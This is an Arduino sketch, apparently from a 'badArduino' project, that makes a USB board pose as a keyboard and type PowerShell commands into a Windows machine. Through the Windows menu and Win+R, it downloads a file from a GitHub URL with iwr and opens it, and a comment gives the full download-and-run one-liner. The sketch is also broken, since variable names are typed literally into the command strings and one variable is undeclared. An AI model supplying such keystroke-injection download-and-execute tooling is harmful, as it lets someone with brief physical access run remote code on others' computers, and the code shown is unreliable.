  #include <Keyboard.h>
 // #include <HID.h>


void setup() {
   Keyboard.begin();
    // This delay is mandatory. If you want to understand why, delete it.
    // Wait 1350 ms = 1,35 seconds
    delay(1350);

   
  char strRutaUrl[] = "https://raw.githubusercontent.com/ourenseko/badArduino/cuentoLechera.jpg";
  char srtRutaPc[] = "Desktop";
  char strFile[] = "cuentoLechera.jpg";
  int intTimeDownload = 4; // seconds, (Mb Size * 4 ; min. 250Kb/s)  

/***
 * Comando completo:
 * $ powershell -command " &{ cd C:\users\%username%\desktop ; iwr "https://raw.githubusercontent.com/ourenseko/test/main/cuentoLechera.jpg" -outfile cuentoLechera.jpg ; start-sleep 4 ; start cuentoLechera.jpg } "
 * 
 * 
 * 
***/


 // Press Windows key
    Keyboard.press(KEY_LEFT_GUI);
    delay(300);
    Keyboard.releaseAll();
    delay(300);
    Keyboard.println("powershell -command \" &{ cd strRutaPC[] ; iwr strRutaUrl[] -outfile strFile[] ; start-sleep intTimeDownload ; start strNameFile[] } \" ");
    delay(600);
    Keyboard.println("cd strRutaPC[] ; iwr strRutaUrl[] -outfile strFile[] ; start-sleep intTimeDownload ; start strNameFile[] ; exit");
// Press ENTER key
    typeKey(KEY_RETURN);
    typeKey(KEY_RETURN);
    delay(300);

  
/*** REPEAT WITH CRTL+R  ***/

 // Press Windows key
    Keyboard.press(KEY_LEFT_GUI);
    delay(300);
    // Press R key
    Keyboard.press('r');
    // Release the keys Windows and R so output = WIN + R
    Keyboard.releaseAll();
    delay(300);
// launch
    Keyboard.println("powershell.exe");
    // Press ENTER key
    typeKey(KEY_RETURN);
    delay(300);
// typing
    Keyboard.println(" cd strRutaPC[] ; iwr strRutaUrl[] -outfile strFile[] ; start-sleep intTimeDownload ; start strNameFile[] ; exit");



//End Keyboard Control
    Keyboard.end();
}


// We not use this for security
void loop() {}



// Utility function
void typeKey(int key){
  // Press key
  Keyboard.press(key);
  // Wait 300 ms
  delay(300);
  // Release key
  Keyboard.release(key);
}
